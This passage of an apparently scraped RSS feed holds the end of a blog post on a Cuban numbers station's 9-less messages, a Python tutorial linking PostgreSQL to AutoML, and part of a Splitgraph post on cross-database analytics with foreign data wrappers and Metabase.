If you want to hear what this sounded like, here's a recording I made on October 4, 2008 of one of the hourly voice transmissions, as received (static and all) in my Philadelphia apartment: <a target="_blank" href="https://www.mattblaze.org/private/17435khz-200810041700.mp3"><tt>www.mattblaze.org/private/17435khz-200810041700.mp3</tt></a>. The transmission follows the standard Cuban numbers format of the time, starting with an "Atenƒáion" preamble listing three five-digit identifiers for the three messages that follow, and ending with "Final, Final". In this recording, the first of the three messages (64202) starts at 3:00, the second (65852) at 16:00, and the third (86321) at 29:00, with the "Final" signoff at the end. The transmissions are, to my cryptographic ear at least, both profoundly dull and yet also eerily riveting. 
</p><p>
And this is where the mystery I've been wondering about comes in. In 2007, I noticed an odd anomaly: some messages completely lacked the digit 9 ("nueve"). Most messages had, as they always did and as you'd expect with OTP ciphertext, a uniform distribution of the digits 0-9. But other messages, at random times, suddenly had no 9s at all. I wasn't the only (or the first) person to notice this; apparently the 9s started disappearing from messages some time around 2005.
</p><p>
This is, to say the least, very odd. The way OTPs work should produce a uniform distribution of all ten digits in the ciphertext. The odds of an entire message lacking 9s (or any other digit) are infinitesimal. And yet such messages were plainly being transmitted, and fairly often at that. In fact, in the recording of the 2008 transmission linked to above, you will notice that while the second and third messages use all ten digits, the first is completely devoid of 9s.
</p><p>
I remember concluding that the most likely, if still rather improbable, explanation was that the 9-less messages were dummy fill traffic and that the random number generator used to create the messages had a bug or developed a defect that prevented 9s from being included. This would be, to say the least, a very serious error, since it would allow a listener to easily distinguish fill traffic from real traffic, completely negating the benefit of having fill traffic in the first place. It would open the door to exactly the kind of traffic analysis that the system was carefully engineered to thwart. The 9-less messages went on for almost ten years. (If I were reporting this as an Internet vulnerability, I would dub it the "Nein Nines" attack; please forgive the linguistic muddle). But I was resigned to the likelihood that I would never know for sure.
</p><p>
And this brings us to the second observation from Strzok's book.
</p><p>
<em>Compromised</em> doesn't say anything about missing nueves, but he does mention that the FBI exploited a serious tradecraft error on the part of the sender: the FBI was able ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.mattblaze.org/blog/neinnines/">https://www.mattblaze.org/blog/neinnines/</a></em></p>]]>
            </description>
            <link>https://www.mattblaze.org/blog/neinnines/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24515717</guid>
            <pubDate>Fri, 18 Sep 2020 12:17:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: PostgreSQL and Machine Learning - step-by-step python tutorial]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24515598">thread link</a>) | @pplonski86
<br/>
September 18, 2020 | https://mljar.com/blog/postgresql-machine-learning/ | <a href="https://web.archive.org/web/*/https://mljar.com/blog/postgresql-machine-learning/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<p><img src="https://raw.githubusercontent.com/mljar/mljar-examples/master/media/PostgreSQL_AutoML_v2.png" alt="PostgreSQL and Machine Learning"></p>

<p>I will show you how to apply Machine Learning algorithms on data from the PostgreSQL database to get insights and predictions. I will use an Automated Machine Learning (AutoML) <a href="https://github.com/mljar/mljar-supervised"><strong>supervised</strong></a>. It is an open-source python package. Thanks to AutoML I will get quick access to many ML algorithms: Decision Tree, Logistic Regression, Random Forest, Xgboost, Neural Network. The AutoML will handle feature engineering as well. I will show you python code snippets that can be reused to integrate Machine Learning with PostgreSQL as a part of the ETL pipeline.</p>

<p>You can find all the code used in this post in the <a href="https://github.com/mljar/integrations/tree/master/PostgreSQL_AutoML">GitHub</a>.</p>

<hr>

<h2 id="the-marketing-data">The marketing data</h2>

<p>I will use <a href="https://www.kaggle.com/yufengsui/portuguese-bank-marketing-data-set"><strong>Portugese Bank Marketing</strong></a> dataset (<code>bank_cleaned.csv</code> file). This dataset is about the marketing campaigns, which aim to promote financial products for existing customers of a Portuguese bank. The each contact to the client is described by:</p>

<div><div><pre><code><span>columns</span> <span>=</span> <span>[</span><span>"age"</span><span>,</span> <span>"job"</span><span>,</span> <span>"marital"</span><span>,</span> <span>"education"</span><span>,</span> <span>"default_payment"</span><span>,</span> <span>"balance"</span><span>,</span> <span>"housing"</span><span>,</span>
           <span>"loan"</span><span>,</span> <span>"day"</span><span>,</span> <span>"month"</span><span>,</span> <span>"duration"</span><span>,</span> <span>"campaign"</span><span>,</span> <span>"pdays"</span><span>,</span> <span>"previous"</span><span>,</span> <span>"poutcome"</span>
           <span>"response"</span> <span># the target</span>
          <span>]</span>
</code></pre></div></div>

<p>The <code>response</code> is the taget column, which contains the information if customer subscribed to the financial product. The goal of the analysis will be to predict whether customer will select the subscription.</p>

<p>In this analysis I will split the dataset into:</p>

<ul>
  <li>training data (<code>32,672</code> samples),</li>
  <li>testing data (<code>8,169</code> samples).</li>
</ul>

<p>All datasets are inserted into database, but <strong>for testing data the <code>response</code> is not inserted</strong>.</p>

<h2 id="setup-postgresql-database-in-docker">Setup PostgreSQL database in Docker</h2>

<p>I will set-up the PostgreSQL database in the docker.</p>

<p>The <code>Dockerfile</code> with PostgreSQL:</p>

<div><div><pre><code>FROM postgres:alpine
EXPOSE 5555
</code></pre></div></div>

<p>To build docker image and run container:</p>

<div><div><pre><code>docker build -t mydb:latest .
docker run --name my_local_db -e POSTGRES_PASSWORD=1234 -e POSTGRES_DB=db -p 5555:5432 mydb:latest
</code></pre></div></div>

<h2 id="create-table-and-insert-the-training-data">Create table and insert the training data</h2>

<p>For interacting with the database I will use python scripts and <code>psycopg2</code> package. To initialize the database please use the <a href="https://github.com/mljar/integrations/blob/master/PostgreSQL_AutoML/init_db.py"><code>init_db.py</code></a> file. Let‚Äôs dig into the code.</p>

<div><div><pre><code><span>""" init_db.py file """</span>
<span>import</span> <span>numpy</span> <span>as</span> <span>np</span>
<span>import</span> <span>pandas</span> <span>as</span> <span>pd</span>
<span>import</span> <span>psycopg2</span>
<span>from</span> <span>io</span> <span>import</span> <span>StringIO</span>

<span>from</span> <span>sklearn.model_selection</span> <span>import</span> <span>train_test_split</span>
<span>from</span> <span>db</span> <span>import</span> <span>db_engine</span> 

<span>create_table_sql</span> <span>=</span> <span>"""
CREATE TABLE IF NOT EXISTS marketing (
    id serial PRIMARY KEY,
    age integer,
    job varchar(128),
    marital varchar(128),
    education varchar(128),
    default_payment varchar(128),
    balance integer,
    housing varchar(128),
    loan varchar(128),
    day integer,
    month varchar(128),
    duration real,
    campaign integer, 
    pdays integer,
    previous integer,
    poutcome varchar(128),
    response varchar(128),
    predicted_response varchar(128)
)
"""</span>

<span>get_data_sql</span> <span>=</span> <span>"""select * from marketing"""</span>

<span>df</span> <span>=</span> <span>pd</span><span>.</span><span>read_csv</span><span>(</span><span>"data/bank_cleaned.csv"</span><span>,</span> <span>index_col</span><span>=</span><span>"id"</span><span>)</span>
<span>df</span><span>.</span><span>drop</span><span>(</span><span>"response_binary"</span><span>,</span> <span>axis</span><span>=</span><span>1</span><span>,</span> <span>inplace</span><span>=</span><span>True</span><span>)</span>
<span>df</span><span>[</span><span>"predicted_response"</span><span>]</span> <span>=</span> <span>""</span>
<span>test_size</span><span>=</span> <span>0.20</span> <span># 20% for testing</span>
<span>df_train</span><span>,</span> <span>df_test</span> <span>=</span> <span>train_test_split</span><span>(</span><span>df</span><span>,</span> <span>test_size</span><span>=</span><span>test_size</span><span>,</span> <span>random_state</span><span>=</span><span>1234</span><span>)</span>
<span>df_train</span><span>.</span><span>to_csv</span><span>(</span><span>"data/train.csv"</span><span>)</span>
<span>df_test</span><span>.</span><span>to_csv</span><span>(</span><span>"data/test.csv"</span><span>)</span>
<span>df_test</span> <span>=</span> <span>df_test</span><span>.</span><span>copy</span><span>()</span>
<span>df_test</span><span>[</span><span>"response"</span><span>]</span> <span>=</span> <span>""</span>

<span>df</span> <span>=</span> <span>pd</span><span>.</span><span>concat</span><span>([</span><span>df_train</span><span>,</span> <span>df_test</span><span>])</span>

<span>try</span><span>:</span>
    <span>conn</span> <span>=</span> <span>psycopg2</span><span>.</span><span>connect</span><span>(</span><span>db_engine</span><span>())</span>
    <span>cur</span> <span>=</span> <span>conn</span><span>.</span><span>cursor</span><span>()</span>
    <span>print</span><span>(</span><span>"Create marketing table"</span><span>)</span>
    <span>cur</span><span>.</span><span>execute</span><span>(</span><span>create_table_sql</span><span>)</span>
    <span>conn</span><span>.</span><span>commit</span><span>()</span>
    <span>print</span><span>(</span><span>"Insert train and test data into table ..."</span><span>)</span>
    <span>buffer</span> <span>=</span> <span>StringIO</span><span>()</span>
    <span>df</span><span>.</span><span>to_csv</span><span>(</span><span>buffer</span><span>,</span> <span>index_label</span><span>=</span><span>"id"</span><span>,</span> <span>header</span><span>=</span><span>False</span><span>)</span>
    <span>buffer</span><span>.</span><span>seek</span><span>(</span><span>0</span><span>)</span>
    <span>cur</span><span>.</span><span>copy_from</span><span>(</span><span>buffer</span><span>,</span> <span>"marketing"</span><span>,</span> <span>sep</span><span>=</span><span>","</span><span>)</span>
    <span>conn</span><span>.</span><span>commit</span><span>()</span>
    <span>print</span><span>(</span><span>"Insert finished."</span><span>)</span>

    <span>cur</span><span>.</span><span>close</span><span>()</span>
<span>except</span> <span>Exception</span> <span>as</span> <span>e</span><span>:</span>
    <span>print</span><span>(</span><span>"Problems:"</span><span>,</span> <span>str</span><span>(</span><span>e</span><span>))</span>
</code></pre></div></div>

<p>The code is doing three things:</p>

<ol>
  <li>Create the <code>marketing</code> table if it not exists.</li>
  <li>Split the data into train and test sets (<code>80%/20%</code> split). Datasets are saved to the disk.</li>
  <li>Datasets are inserted into table in the database. The <code>response</code> values is removed from test samples.</li>
</ol>

<p>The data is in the database. Let‚Äôs log into PostgreSQL to check:</p>

<div><div><pre><code>&gt; psql -U postgres -d db --host=0.0.0.0 --port=5555 

db=# select count(*) from marketing;
 count 
-------
 40841
(1 row)

db=# select response, count(*) from marketing group by response;
 response | count 
----------+-------
 no       | 28952
          |  8169
 yes      |  3720
(3 rows)
</code></pre></div></div>

<h2 id="lets-train-the-machine-learning-models">Let‚Äôs train the Machine Learning models!</h2>

<p>To integrate PostgreSQL with Machine Learning we will need:</p>

<ul>
  <li>method to get training data - <code>get_train_data()</code>,</li>
  <li>method to get live data (for computing predictions) - <code>get_live_data()</code>,</li>
  <li>method to insert predictions into the database - <code>insert_predictions(predictions, ids)</code>,</li>
  <li>method to get predictions (to compute the accuracy) - <code>get_predictions()</code>.</li>
</ul>

<p>I‚Äôve created <a href="https://github.com/mljar/integrations/blob/master/PostgreSQL_AutoML/db.py"><code>db.py</code></a> file to communicate with the database (with <code>psychopg2</code>):</p>

<div><div><pre><code> <span>""" db.py file """</span>
 <span>""" Database API """</span>
<span>import</span> <span>json</span>
<span>import</span> <span>numpy</span> <span>as</span> <span>np</span>
<span>import</span> <span>pandas</span> <span>as</span> <span>pd</span>
<span>import</span> <span>psycopg2</span>
<span>from</span> <span>io</span> <span>import</span> <span>StringIO</span>

<span>def</span> <span>db_engine</span><span>():</span>
    <span>config</span> <span>=</span> <span>json</span><span>.</span><span>load</span><span>(</span><span>open</span><span>(</span><span>"config.json"</span><span>))</span>
    <span>host</span> <span>=</span> <span>config</span><span>[</span><span>"connection"</span><span>][</span><span>"host"</span><span>]</span>
    <span>port</span> <span>=</span> <span>config</span><span>[</span><span>"connection"</span><span>][</span><span>"port"</span><span>]</span>
    <span>user</span> <span>=</span> <span>config</span><span>[</span><span>"connection"</span><span>][</span><span>"user"</span><span>]</span>
    <span># password should be hidden in production setting</span>
    <span># do not store it in config.json</span>
    <span>password</span> <span>=</span> <span>config</span><span>[</span><span>"connection"</span><span>][</span><span>"password"</span><span>]</span>
    <span>db</span> <span>=</span> <span>config</span><span>[</span><span>"connection"</span><span>][</span><span>"db"</span><span>]</span>

    <span>return</span> <span>"user='{}' password='{}' host='{}' port='{}' dbname='{}'"</span><span>.</span><span>format</span><span>(</span>
        <span>user</span><span>,</span> <span>password</span><span>,</span> <span>host</span><span>,</span> <span>port</span><span>,</span> <span>db</span>
    <span>)</span>

<span>def</span> <span>sql_to_df</span><span>(</span><span>sql_query</span><span>):</span>
    <span>try</span><span>:</span>
        <span>conn</span> <span>=</span> <span>psycopg2</span><span>.</span><span>connect</span><span>(</span><span>db_engine</span><span>())</span>
        <span>cur</span> <span>=</span> <span>conn</span><span>.</span><span>cursor</span><span>()</span>
        <span>cur</span><span>.</span><span>execute</span><span>(</span><span>sql_query</span><span>)</span>
        <span>df</span> <span>=</span> <span>pd</span><span>.</span><span>DataFrame</span><span>(</span><span>cur</span><span>.</span><span>fetchall</span><span>(),</span> <span>columns</span><span>=</span><span>[</span><span>elt</span><span>[</span><span>0</span><span>]</span> <span>for</span> <span>elt</span> <span>in</span> <span>cur</span><span>.</span><span>description</span><span>])</span>
        <span>cur</span><span>.</span><span>close</span><span>()</span>
        <span>return</span> <span>df</span>
    <span>except</span> <span>Exception</span> <span>as</span> <span>e</span><span>:</span>
        <span>print</span><span>(</span><span>"Problems:"</span><span>,</span> <span>str</span><span>(</span><span>e</span><span>))</span>
    
    <span>return</span> <span>None</span>


<span>def</span> <span>get_train_data</span><span>():</span>
    <span>config</span> <span>=</span> <span>json</span><span>.</span><span>load</span><span>(</span><span>open</span><span>(</span><span>"config.json"</span><span>))</span>
    <span>table</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"table"</span><span>]</span>
    <span>features</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"features"</span><span>]</span>
    <span>target</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"target"</span><span>]</span>
    <span>get_data_sql</span> <span>=</span> <span>f</span><span>"select {','.join(features+[target])} from {table} where {target} != ''"</span>
    <span>df</span> <span>=</span> <span>sql_to_df</span><span>(</span><span>get_data_sql</span><span>)</span>
    <span>if</span> <span>df</span> <span>is</span> <span>None</span><span>:</span>
        <span>return</span> <span>None</span><span>,</span> <span>None</span>
    <span>return</span> <span>df</span><span>[</span><span>features</span><span>],</span> <span>df</span><span>[</span><span>target</span><span>]</span>
    
    
<span>def</span> <span>get_live_data</span><span>():</span>
    <span>config</span> <span>=</span> <span>json</span><span>.</span><span>load</span><span>(</span><span>open</span><span>(</span><span>"config.json"</span><span>))</span>
    <span>table</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"table"</span><span>]</span>
    <span>features</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"features"</span><span>]</span>
    <span>target</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"target"</span><span>]</span>
    <span>predicted</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"predicted"</span><span>]</span>
    <span>id_column</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"id"</span><span>]</span>
    <span>get_data_sql</span> <span>=</span> <span>f</span><span>"select {','.join(features + [id_column])} from {table} where {target} = '' and {predicted} = ''"</span>
    <span>df</span> <span>=</span> <span>sql_to_df</span><span>(</span><span>get_data_sql</span><span>)</span>
    <span>if</span> <span>df</span> <span>is</span> <span>None</span><span>:</span>
        <span>return</span> <span>None</span><span>,</span> <span>None</span>
    <span>return</span> <span>df</span><span>[</span><span>features</span><span>],</span> <span>df</span><span>[</span><span>id_column</span><span>]</span>


<span>def</span> <span>get_predictions</span><span>():</span>
    <span>config</span> <span>=</span> <span>json</span><span>.</span><span>load</span><span>(</span><span>open</span><span>(</span><span>"config.json"</span><span>))</span>
    <span>table</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"table"</span><span>]</span>
    <span>target</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"target"</span><span>]</span>
    <span>predicted</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"predicted"</span><span>]</span>
    <span>id_column</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"id"</span><span>]</span>
    <span>get_data_sql</span> <span>=</span> <span>f</span><span>"select {','.join([predicted] + [id_column])} from {table} where {target} = ''"</span>
    <span>df</span> <span>=</span> <span>sql_to_df</span><span>(</span><span>get_data_sql</span><span>)</span>
    <span>if</span> <span>df</span> <span>is</span> <span>None</span><span>:</span>
        <span>return</span> <span>None</span>
    <span>df</span><span>.</span><span>index</span> <span>=</span> <span>df</span><span>[</span><span>id_column</span><span>]</span>
    <span>return</span> <span>df</span>
    
<span>def</span> <span>insert_predictions</span><span>(</span><span>predictions</span><span>,</span> <span>ids</span><span>):</span>
    <span>config</span> <span>=</span> <span>json</span><span>.</span><span>load</span><span>(</span><span>open</span><span>(</span><span>"config.json"</span><span>))</span>
    <span>table</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"table"</span><span>]</span>
    <span>predicted</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"predicted"</span><span>]</span>
    <span>id_column</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"id"</span><span>]</span>

    <span>try</span><span>:</span>
        <span>conn</span> <span>=</span> <span>psycopg2</span><span>.</span><span>connect</span><span>(</span><span>db_engine</span><span>())</span>
        <span>cur</span> <span>=</span> <span>conn</span><span>.</span><span>cursor</span><span>()</span>
        <span>tuples</span> <span>=</span> <span>list</span><span>(</span><span>zip</span><span>(</span><span>predictions</span><span>,</span> <span>ids</span><span>))</span>
        <span>sql_query</span> <span>=</span> <span>f</span><span>"update {table} set {predicted} = </span><span>%</span><span>s where {id_column} = </span><span>%</span><span>s"</span>
        <span>cur</span><span>.</span><span>executemany</span><span>(</span><span>sql_query</span><span>,</span> <span>tuples</span><span>)</span>
        <span>conn</span><span>.</span><span>commit</span><span>()</span>
    <span>except</span> <span>Exception</span> <span>as</span> <span>e</span><span>:</span>
        <span>print</span><span>(</span><span>"Problems:"</span><span>,</span> <span>str</span><span>(</span><span>e</span><span>))</span>
</code></pre></div></div>

<p>You can see that all information needed to connect and to get data is loaded from <a href="https://github.com/mljar/integrations/blob/master/PostgreSQL_AutoML/config.json"><code>config.json</code></a> file:</p>

<div><div><pre><code>{
    "connection": {
        "host": "0.0.0.0",
        "port": 5555,
        "user": "postgres",
        "password": "1234",
        "db": "db"
    },
    "automl": {
        "table": "marketing",
        "features": [
            "age",
            "job",
            "marital",
            "education",
            "default_payment",
            "balance",
            "housing",
            "loan",
            "day",
            "month",
            "duration",
            "campaign",
            "pdays",
            "previous",
            "poutcome"
        ],
        "target": "response",
        "predicted": "predicted_response",
        "id": "id"
    }
}
</code></pre></div></div>

<ul>
  <li>This file contains connection details (<code>host</code>, <code>port</code>, <code>user</code>, <code>password</code>, <code>db</code>).</li>
  <li>Additionaly, it defines the data source for Machine Learning (<code>table</code> parameter). The <code>features</code> describe the AutoML input, <code>target</code> - the AutoML output, <code>predicted</code> -  the name of the column where predictions will be stored, and <code>id</code> is the index column.</li>
  <li>You can resuse this file to define your own integration of PostgreSQL with AutoML.</li>
  <li>The password is in the config file just for example purposes. In production setting, it should be hidden (as environment variable).</li>
</ul>

<h2 id="lets-train-automl">Let‚Äôs train AutoML</h2>

<p>You might find it suprissing but there are only <code>5</code> lines of code in the <a href="https://github.com/mljar/integrations/blob/master/PostgreSQL_AutoML/train_automl.py"><code>train_automl.py</code></a> file:</p>

<div><div><pre><code><span>""" train_automl.py file """</span>
<span>from</span> <span>db</span> <span>import</span> <span>get_train_data</span>
<span>from</span> <span>supervised</span> <span>import</span> <span>AutoML</span>

<span># get the training data</span>
<span>X_train</span><span>,</span> <span>y_train</span> <span>=</span> <span>get_train_data</span><span>()</span>
<span># train AutoML</span>
<span>automl</span> <span>=</span> <span>AutoML</span><span>(</span><span>results_path</span><span>=</span><span>"Response_Classifier"</span><span>)</span>
<span>automl</span><span>.</span><span>fit</span><span>(</span><span>X_train</span><span>,</span> <span>y_train</span><span>)</span>
</code></pre></div></div>

<p>This code gets data for training from the database and <code>fit()</code> AutoML object. The result of the AutoML are saved in <a href="https://github.com/mljar/integrations/tree/master/PostgreSQL_AutoML/Response_Classifier"><code>Response_Classifier</code></a> directory. All models and preprocessing details are <strong>automatically saved</strong> to the hard drive. Additionally, the <code>README.md</code> Markdown reports are created for AutoML and each Machine Learning model. You can check them on GitHub, here are links for few examples:</p>

<ul>
  <li><a href="https://github.com/mljar/integrations/tree/master/PostgreSQL_AutoML/Response_Classifier#automl-leaderboard">AutoML leaderboard report</a>,</li>
  <li><a href="https://github.com/mljar/integrations/blob/master/PostgreSQL_AutoML/Response_Classifier/2_DecisionTree/README.md">Decision Tree report</a>,</li>
  <li><a href="https://github.com/mljar/integrations/blob/master/PostgreSQL_AutoML/Response_Classifier/5_Default_Xgboost/README.md">Xgboost report</a>.</li>
</ul>

<table>
  <thead>
    <tr>
      <th>Best model</th>
      <th>name</th>
      <th>model_type</th>
      <th>metric_type</th>
      <th>metric_value</th>
      <th>train_time</th>
      <th>Link</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>&nbsp;</td>
      <td>1_Baseline</td>
      <td>Baseline</td>
      <td>logloss</td>
      <td>0.354508</td>
      <td>0.32</td>
      <td><a href="https://github.com/mljar/integrations/tree/master/PostgreSQL_AutoML/Response_Classifier/1_Baseline/README.md">Results link</a></td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>2_DecisionTree</td>
      <td>Decision Tree</td>
      <td>logloss</td>
      <td>0.269144</td>
      <td>15.8</td>
      <td><a href="https://github.com/mljar/integrations/tree/master/PostgreSQL_AutoML/Response_Classifier/2_DecisionTree/README.md">Results link</a></td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>3_Linear</td>
      <td>Linear</td>
      <td>logloss</td>
      <td>0.237079</td>
      <td>7.45</td>
      <td><a href="https://github.com/mljar/integrations/tree/master/PostgreSQL_AutoML/Response_Classifier/3_Linear/README.md">Results link</a></td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>4_Default_R‚Ä¶</td></tr></tbody></table></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mljar.com/blog/postgresql-machine-learning/">https://mljar.com/blog/postgresql-machine-learning/</a></em></p>]]>
            </description>
            <link>https://mljar.com/blog/postgresql-machine-learning/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24515598</guid>
            <pubDate>Fri, 18 Sep 2020 11:59:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dogfooding Splitgraph for cross-database analytics in Metabase]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24515353">thread link</a>) | @mildbyte
<br/>
September 18, 2020 | https://www.splitgraph.com/blog/splitgraph-matomo-elasticsearch-metabase | <a href="https://web.archive.org/web/*/https://www.splitgraph.com/blog/splitgraph-matomo-elasticsearch-metabase">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><article><div><nav><ol><li><a href="#our-analytics-stack" as="#our-analytics-stack">Our analytics stack</a></li><li><a href="#how-to-bring-the-data-together" as="#how-to-bring-the-data-together">How to bring the data together?</a></li><li><a href="#sample-queries" as="#sample-queries">Sample queries</a><ol><li><a href="#federated-join" as="#federated-join">Federated JOIN</a></li></ol></li><li><a href="#data-modelling" as="#data-modelling">Data modelling</a></li><li><a href="#metabase" as="#metabase">Metabase</a><ol><li><a href="#setting-up" as="#setting-up">Setting up</a></li><li><a href="#insights" as="#insights">Insights</a></li></ol></li><li><a href="#conclusion" as="#conclusion">Conclusion</a></li></ol></nav><p><a href="https://www.splitgraph.com/" as="https://www.splitgraph.com">Splitgraph</a> is powered by data. We use <a href="https://www.metabase.com/" as="https://www.metabase.com/">Metabase</a> to build BI dashboards that can answer questions about how people interact with us. These dashboards reference our Web analytics data, user data and all events happening across the estate. We can find out how many people queried the Splitgraph <a href="https://www.splitgraph.com/connect" as="https://www.splitgraph.com/connect">Data Delivery Network</a> on a given week, how they found Splitgraph, or if they ever pulled a data image.</p><p>This works without any ETL pipelines or a data warehouse. How do we do it?</p><p>Well, we use Splitgraph.</p><p>In this post, we'll talk about our analytics stack. We'll discuss how we use Splitgraph's <a href="https://www.splitgraph.com/docs/ingesting-data/foreign-data-wrappers/introduction" as="https://www.splitgraph.com/docs/ingesting-data/foreign-data-wrappers/introduction"><code>sgr mount</code></a> command to proxy to data from Matomo, Elasticsearch and PostgreSQL. We'll show a sample SQL query that runs a federated JOIN between these three databases. Finally, we'll talk about how we use Metabase to get a clear view of the business.</p><p><img src="https://raw.githubusercontent.com/splitgraph/splitgraph.com/master/content/blog/images/20200918-splitgraph-matomo-elasticsearch-metabase/00-diagram.png"><em>Architecture diagram of our analytics setup.</em></p><section><h2 id="our-analytics-stack">Our analytics stack</h2><p>We hate third-party trackers. At the same time, we would like to know what's happening on the website and across the company in general. In the age of CDNs, a visit to a website might never reach the origin server. HTTP server logs won't show the full story about website visitors.</p><p>To solve that, we started using <strong><a href="https://matomo.org/" as="https://matomo.org/">Matomo</a></strong>. Matomo is an open-source web analytics platform. It offers a similar interface and feature set to Google Analytics. However, unlike GA, it stores all data locally in a MySQL database.</p><p>Besides visiting the website, there's a lot of other ways users can interact with Splitgraph. For example:</p><ul><li>Starring Splitgraph on GitHub or downloading a release</li><li>Querying the Splitgraph <a href="https://www.splitgraph.com/connect" as="https://www.splitgraph.com/connect">Data Delivery Network</a> from an SQL client</li><li>Pushing and pulling <a href="https://splitgraph.com/docs/concepts/images" as="https://splitgraph.com/docs/concepts/images">data images</a> to/from Splitgraph</li><li>Using the <a href="https://www.splitgraph.com/docs/splitgraph-cloud/publish-rest-api" as="https://www.splitgraph.com/docs/splitgraph-cloud/publish-rest-api">REST API</a></li><li>Checking for updates: we use this to estimate the number of active <code>sgr</code> users</li></ul><p>We use <strong>Elasticsearch</strong> to log these and other interesting events.</p><p>Finally, we have a <strong>PostgreSQL</strong> database that stores actual user data. Some of it could be useful to know in an analytics context. For example: a user's primary e-mail address or their GitHub ID.</p></section><section><h2 id="how-to-bring-the-data-together">How to bring the data together?</h2><p>The idea for this setup came to us when we were trying to get some data from the Matomo Web UI. While it is pretty powerful, it's limited in the kinds of reports it can produce. Also, data we'd see in Matomo didn't include anything we store in Elasticsearch.</p><p>We wondered if we could query the data from Matomo's MySQL database directly. The <a href="https://developer.matomo.org/guides/database-schema" as="https://developer.matomo.org/guides/database-schema">schema</a>, albeit complex, is well documented on their website.</p><p>We could ingest data into Elasticsearch. However, we were already using Kibana to visualize Elasticsearch data and its visualizations were sometimes frustrating to use. Basic functionality like plotting sums is only available through scripted Elasticsearch fields.</p><p><img src="https://raw.githubusercontent.com/splitgraph/splitgraph.com/master/content/blog/images/20200918-splitgraph-matomo-elasticsearch-metabase/01-kibana.png"><em>Pictured: five different visualization engines that Kibana lets you use</em></p><p>But then we thought about it some more. Splitgraph itself is built on top of PostgreSQL. One of its features is making PostgreSQL <a href="https://www.splitgraph.com/blog/foreign-data-wrappers" as="https://www.splitgraph.com/blog/foreign-data-wrappers">foreign data wrappers</a> more user-friendly. Splitgraph's <code>sgr mount</code> lets you instantiate an FDW with a single command. You can then query the data directly or snapshot it.</p><p>Could we use a Splitgraph instance and add a MySQL FDW to it to query Matomo data?</p><p>And if we did, could we use an Elasticsearch FDW to proxy to our events data?</p><p>And if we did that, could we use something like <a href="https://www.metabase.com/" as="https://www.metabase.com/">Metabase</a> and point it at Splitgraph, letting it query data across all our data silos?</p><p>Turns out, we could. Here's an abridged version of how we mount Matomo data on a Splitgraph instance. We have a full set of commands on <a href="https://github.com/splitgraph/splitgraph/tree/master/examples/cross-db-analytics" as="https://github.com/splitgraph/splitgraph/tree/master/examples/cross-db-analytics">our GitHub</a>.</p><pre><code>sgr mount mysql_fdw matomo_raw -c matomo:$PASSWORD@matomo-db -o@- &lt;&lt;EOF
{
  "remote_schema": "matomo",
  "tables": {
    "matomo_log_action": {
      "hash": "bigint",
      "idaction": "integer",
      "name": "character varying(4096)",
      "type": "smallint",
      "url_prefix": "smallint"
    },
    "matomo_log_visit": {
      "idvisit": "bigint",
      "idvisitor": "bytea",
      "user_id": "character varying(200)",
      "location_ip": "bytea",
      "referer_url": "text",
      "visit_entry_idaction_name": "integer",
      "visit_entry_idaction_url": "integer",
      "visit_exit_idaction_name": "integer",
      "visit_exit_idaction_url": "integer",
      "visit_first_action_time": "timestamp without time zone",
      "visit_last_action_time": "timestamp without time zone",
      "visit_total_actions": "integer",
      "visitor_count_visits": "integer",
      "visitor_days_since_first": "smallint",
      "visitor_days_since_last": "smallint",
      "visitor_returning": "smallint"
    }
  }
}
EOF
</code></pre><p>In this, we just pull out interesting tables and columns from Matomo. The full Matomo schema spec for Splitgraph is available <a href="https://github.com/splitgraph/splitgraph/blob/master/examples/cross-db-analytics/mounting/matomo.json" as="https://github.com/splitgraph/splitgraph/blob/master/examples/cross-db-analytics/mounting/matomo.json">here</a>.</p><p>To query Elasticsearch, we used a <a href="https://github.com/splitgraph/postgres-elasticsearch-fdw" as="https://github.com/splitgraph/postgres-elasticsearch-fdw">fork</a> of <code>postgres-elasticsearch-fdw</code> with the ability to push down qualifiers. We made it available as an <code>sgr mount</code> subcommand. Here's an example:</p><pre><code>sgr mount elasticsearch -c elasticsearch:9200 -o@- &lt;&lt;EOF
{
  "table_spec": {
    "github_scraper_data": {
      "schema": {
        "id": "text",
        "@timestamp": "timestamp",
        "sg.github.stars": "integer",
        "sg.github.issues": "integer",
        "sg.github.downloads_installer": "integer",
        "sg.github.downloads_osx": "integer",
        "sg.github.downloads_linux": "integer",
        "sg.github.downloads_windows": "integer"
      },
      "index": "sg-misc*",
      "rowid_column": "id"
    }
  }
}
EOF
